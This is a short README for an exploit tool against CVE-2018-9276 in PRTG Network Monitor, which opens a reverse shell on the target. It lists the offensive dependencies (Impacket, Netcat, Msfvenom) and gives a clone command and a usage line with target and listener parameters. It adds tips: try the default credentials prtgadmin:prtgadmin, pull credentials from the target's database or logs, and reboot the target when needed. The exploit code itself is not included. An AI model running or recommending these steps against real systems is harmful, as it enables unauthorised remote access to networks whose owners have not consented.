# CVE-2018-9276
CVE-2018-9276 PRTG &lt; 18.2.39 Reverse Shell (Python3 support)

# Dependancies
* Impacket (python3 version)
* Netcat
* Msfvenom

# Usage
```
git clone https://github.com/A1vinSmith/CVE-2018-9276.git

./exploit.py -i targetIP -p targetPort --lhost hostIP --lport hostPort --user user --password pass
```

1. The credentials are needed for performing the exploit. Try default credentials `prtgadmin:prtgadmin`. And It might be worth checking the database or log to gain them. https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data
2. Try `--lport 445` if the port has not been occupied
3. There are few twisted comments in the code. They might need some modifications.
4. It might take few attempts to succeed. Reboot a target machine is always a good option. Especially when your payload causes some impact.
